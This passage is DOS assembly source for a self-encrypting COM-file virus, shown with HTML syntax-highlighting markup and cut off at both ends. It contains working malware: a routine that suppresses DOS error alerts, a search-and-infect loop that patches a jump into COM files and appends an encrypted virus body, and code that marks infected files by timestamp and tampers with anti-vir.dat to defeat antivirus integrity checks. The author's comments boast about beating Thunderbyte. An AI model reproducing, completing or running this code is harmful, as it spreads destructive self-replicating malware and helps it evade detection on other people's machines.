</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Old24O</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">                </span><span class="sc1">; and now we fix it at our handle</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fake_24</span><span class="sc0">           </span><span class="sc1">; everyting is kewl , no more</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; user aler</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">              </span><span class="sc1">; get current drive from dos</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">; is it &lt;&gt; a or b then put iswriteprot</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">changethings</span><span class="sc0">             </span><span class="sc1">; off</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">16h</span><span class="sc0">              </span><span class="sc1">; if a disk8 drive then set if </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; disk are changed since last times</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">                 </span><span class="sc1">; if so , put iswriteprot off</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                </span><span class="sc1">; is ah = 6 ?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">don_tchange</span><span class="sc0">             </span><span class="sc1">; no then don't change anything</span><span class="sc0">

</span><span class="sc5">changethings</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">iswriteprot</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; put off siwriteprot</span><span class="sc0">

</span><span class="sc5">don_tchange</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">iswriteprot</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; if iswriteprot on then skip</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_of_find</span><span class="sc0">              </span><span class="sc1">; infection procedure</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">                              </span><span class="sc1">; Find first (Com)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">com</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">next</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">Do_int21</span><span class="sc0">                           </span><span class="sc1">; equal Int 21</span><span class="sc0">

</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">end_of_Find</span><span class="sc0">                          </span><span class="sc1">; FF/FN </span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">iswriteprot</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; is disk protected ?</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_of_Find</span><span class="sc0">              </span><span class="sc1">; nah , so continue infections</span><span class="sc0">

</span><span class="sc5">next0</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next</span><span class="sc0">

</span><span class="sc5">end_of_Find</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Old24O</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; restore old Int 24 Seg:Off</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Old24S</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; take a look on it !</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">                </span><span class="sc1">; restore it</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; ask dos , dos do it!</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Uncheck</span><span class="sc0">         </span><span class="sc1">; De-allocate memory</span><span class="sc0">

</span><span class="sc5">fin0</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">          </span><span class="sc1">; Fix Dta</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">              </span><span class="sc1">; restore seg+reg</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">JmpTo</span><span class="sc0">           </span><span class="sc1">; return to int 21</span><span class="sc0">

</span><span class="sc5">go</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">; Lseek ( hehehehe )</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">inf_ret0</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;********************************************** Add yar infection proc here !</span><span class="sc0">
</span><span class="sc1">; Part Four</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 44 4</span><span class="sc0">
</span><span class="sc1">; 4444  4ø) Com infection</span><span class="sc0">
</span><span class="sc1">;    4</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">


</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; infect only if sec &lt;&gt; 02</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">00001111b</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">00000001b</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">inf_ret0</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                            </span><span class="sc1">; destroy attribute</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc2">30</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                            </span><span class="sc1">; open in r/w</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0"> 
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                              </span><span class="sc1">; save 3 first byte</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">save</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                                </span><span class="sc1">; only for anti-vir if infection Ok</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">save</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">                 </span><span class="sc1">; check if exe</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">save</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">                 </span><span class="sc1">; check if exe</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">go</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc2">25</span><span class="sc4">],</span><span class="sc2">0E9h</span><span class="sc0">              </span><span class="sc1">; make the jump</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc2">26</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                              </span><span class="sc1">; write it</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc2">25</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">go</span><span class="sc0">                                 </span><span class="sc1">; go to the end</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                            </span><span class="sc1">; go to the end -7</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                              </span><span class="sc1">; read 7 last bytes of the files</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">buffer7</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">buffer7</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc5">fin</span><span class="sc4">-</span><span class="sc5">start0</span><span class="sc0">     </span><span class="sc1">; add the size of the file</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">encrypt_and_write</span><span class="sc0">                  </span><span class="sc1">; write the virus encrypted</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">                                  </span><span class="sc1">; bp = 1 ( dec bp , flag Z = 1</span><span class="sc0">
                                        </span><span class="sc1">; infection OK -&gt; Modify Anti-vir.dat</span><span class="sc0">
</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                            </span><span class="sc1">; fix sec = 02</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">11110000b</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                              </span><span class="sc1">; close the file</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                            </span><span class="sc1">; restore attribute</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc2">21</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Closing_star</span><span class="sc0">            </span><span class="sc1">; if no infection don't change anti-v.</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">antivmodif</span><span class="sc0">                         </span><span class="sc1">; update anti-vir.dat</span><span class="sc0">

</span><span class="sc5">Closing_star</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">; return to tha caller</span><span class="sc0">

</span><span class="sc5">encrypt_and_write</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                 </span><span class="sc1">; save cs cs</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">temporary_seg</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; copy in temporary_seg the virus</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">fin</span><span class="sc4">-</span><span class="sc5">start0</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">repz</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc2">26</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; encrypt encrypt_end-encrypt_begin1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">key2</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">encrypt_begin1</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">encrypt_end</span><span class="sc4">-</span><span class="sc5">encrypt_begin1</span><span class="sc0">

</span><span class="sc5">enc_loop0</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">enc_loop0</span><span class="sc0">              </span><span class="sc1">; do the encryption!</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc2">27</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; encrypt encrypt_end-encrypt_begin</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">key1</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">encrypt_begin</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">encrypt_end</span><span class="sc4">-</span><span class="sc5">encrypt_begin</span><span class="sc0">

</span><span class="sc5">enc_loop1</span><span class="sc4">:</span><span class="sc0">                              
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">enc_loop1</span><span class="sc0">              </span><span class="sc1">; do the encryption!</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                              </span><span class="sc1">; write the encrypted virus</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">fin</span><span class="sc4">-</span><span class="sc5">start0</span><span class="sc0">           </span><span class="sc1">; put in cx size</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">start0</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; hehe , we are in meeemory !</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; !DO IT! Here we gooo!</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">; Part five</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 5555</span><span class="sc0">
</span><span class="sc1">;  5555 5ø) Check if condition aivable for modifing Anti-vir.dat</span><span class="sc0">
</span><span class="sc1">; 55555</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">Check_conditions</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">                                      </span><span class="sc1">; can we allocate a seg ?</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">65000</span><span class="sc4">/</span><span class="sc2">16</span><span class="sc0">                 </span><span class="sc1">; return with C or not C</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Uncheck</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">temporary_seg</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; delocate the seg who was</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">                                      </span><span class="sc1">; allocate upper</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">AM_ret</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">; Here's the C flag totally out , so , I'm the first to fuck Thunderbyte too</span><span class="sc0">
</span><span class="sc1">; deep !</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 66'</span><span class="sc0">
</span><span class="sc1">; 6666 6ø) Modifing Anti-vir.dat</span><span class="sc0">
</span><span class="sc1">; 6666</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">AntivModif</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">                                    </span><span class="sc1">; check if anti-vir.dat </span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">antiv</span><span class="sc4">]</span><span class="sc0">                                  </span><span class="sc1">; really exist</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">AM_ret</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D00h</span><span class="sc0">                                    </span><span class="sc1">; open anti-vir.dat</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">antiv</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ncounter</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; counters are important , they</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">counter</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; serve in good part locations</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                                    </span><span class="sc1">; go on the end</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
